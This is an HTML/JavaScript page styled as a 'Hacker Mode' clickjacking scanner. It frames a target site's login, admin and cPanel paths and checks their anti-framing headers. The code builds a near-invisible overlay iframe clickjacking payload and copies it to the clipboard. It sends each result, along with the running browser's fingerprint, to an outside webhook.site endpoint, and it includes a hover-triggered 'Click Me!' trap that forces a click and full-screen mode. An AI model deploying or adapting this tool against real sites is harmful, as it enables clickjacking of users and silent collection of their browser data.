<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Ultra Clickjack Scanner v3.1 - Hacker Mode</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      font-size: 13px;
      padding: 10px;
    }
    iframe {
      margin: 10px;
      border: 5px solid gray;
    }
    .result {
      margin: 5px;
      padding: 5px;
      border-left: 3px solid;
      white-space: pre-wrap;
    }
    #clickTrap {
      position: fixed;
      top: 80px;
      left: 80px;
      width: 160px;
      height: 60px;
      background: rgba(255, 0, 0, 0.5);
      z-index: 99998;
      text-align: center;
      line-height: 60px;
      font-weight: bold;
      font-family: sans-serif;
      color: white;
      border: 2px dashed white;
      cursor: pointer;
    }
    #hud {
      position: fixed;
      top: 10px;
      left: 10px;
      padding: 10px;
      background: black;
      color: white;
      font-family: monospace;
      z-index: 99999;
      border: 1px solid lime;
    }
  </style>
</head>
<body>
  <div id="hud">
    🛡️ <b>Ultra Clickjack Scanner v3.1</b> - Hacker Mode<br>
    ✅ Green = VULNERABLE<br>
    ⚠️ Orange = FRAMEABLE (But CSP/XFO exists)<br>
    ❌ Red = BLOCKED<br>
    🕵️ Trap + DOM Snapshot + Header Parser Active
  </div>
  <div id="clickTrap"> 🎯 Click Me!</div>
  <script>
    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook

    const urlParams = new URLSearchParams(window.location.search);
    let origin = urlParams.get("target");

    if (!origin) {
      origin = prompt("🚨 Enter target URL (e.g., https://example.com):");
    }

    if (!origin || !/^https?:\/\/[^ ]+$/i.test(origin)) {
      alert("❌ Invalid or missing target URL. Please provide a valid ?target= parameter or enter it manually.");
      throw new Error("Invalid target.");
    }

    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const sleep = ms => new Promise(res => setTimeout(res, ms));
    const fingerprint = () => ({
      ua: navigator.userAgent,
      lang: navigator.language,
      screen: { w: screen.width, h: screen.height },
      window: { w: window.innerWidth, h: window.innerHeight },
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      vendor: navigator.vendor
    });

    const endpoints = [
      "", "/", "/login", "/admin", "/dashboard", "/portal", "/signin", "/secure", "/auth",
      "/panel", "/settings", "/myaccount", "/clients", "/support", "/index", "/user", "/home", "/access",
      "/profile", "/account/settings", "/config", "/console", "/cpanel"
    ];

    const getDOMSnapshot = (doc) => {
      try {
        return [...doc.querySelectorAll("h1,h2,h3,p,a,button")]
          .map(e => e.innerText)
          .filter(Boolean)
          .slice(0, 5)
          .join(" | ").substring(0, 300);
      } catch (e) {
        return "N/A";
      }
    };

    const detectHeaders = async (url) => {
      try {
        const res = await fetch(url, { method: "HEAD", mode: "cors" });
        const headers = {};
        for (let [k, v] of res.headers.entries()) headers[k.toLowerCase()] = v;
        return headers;
      } catch (e) {
        return { error: e.toString() };
      }
    };

    const copyPayload = (url) => {
      const iframe = `<iframe src="${url}" width="800" height="600" style="border:0;position:absolute;top:0;left:0;opacity:0.01;z-index:99999" sandbox="allow-scripts allow-same-origin"></iframe>`;
      navigator.clipboard?.writeText(iframe);
    };

    const testFrame = async (fullURL) => {
      const headers = await detectHeaders(fullURL);
      const xfo = headers['x-frame-options'] || 'NONE';
      const csp = headers['content-security-policy'] || 'NONE';

      const frame = document.createElement("iframe");
      frame.src = fullURL;
      frame.width = rand(800, 1000);
      frame.height = rand(300, 450);
      frame.sandbox = "allow-scripts allow-same-origin";

      const div = document.createElement("div");
      div.className = "result";
      document.body.appendChild(frame);
      document.body.appendChild(div);

      frame.onload = async () => {
        let snapshot = "Cross-origin (DOM access blocked)";
        try {
          if (new URL(fullURL).origin === window.location.origin) {
            const doc = frame.contentDocument || frame.contentWindow.document;
            snapshot = getDOMSnapshot(doc);
          }
        } catch (e) {
          snapshot = "DOM access error: " + e;
        }

        const vulnerable = (xfo === 'NONE' && csp === 'NONE');
        const borderColor = vulnerable ? "lime" : "orange";
        frame.style.border = `5px solid ${borderColor}`;
        div.style.borderColor = borderColor;

        div.innerText = `${vulnerable ? '✅' : '⚠️'} ${fullURL}
DOM Snapshot: ${snapshot}
XFO: ${xfo}
CSP: ${csp}`;

        copyPayload(fullURL);
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: vulnerable ? "VULNERABLE" : "FRAMEABLE-BUT-CSP/XFO",
            url: fullURL,
            fingerprint: fingerprint(),
            snapshot,
            headers
          })
        });
      };

      frame.onerror = () => {
        frame.style.border = "5px solid red";
        div.style.borderColor = "red";
        div.innerText = `❌ ${fullURL}
BLOCKED (Load Error)
XFO: ${xfo}
CSP: ${csp}`;
      };
    };

    (async () => {
      for (const path of endpoints) {
        const fullURL = origin.replace(/\/$/, "") + path;
        await testFrame(fullURL);
        await sleep(rand(350, 600));
      }
    })();

    document.getElementById("clickTrap").addEventListener("mouseover", () => {
      setTimeout(() => {
        document.getElementById("clickTrap").click();
        if (document.documentElement.requestFullscreen) {
          document.documentElement.requestFullscreen();
        }
      }, 1500);
    });
  </script>
</body>
</html>
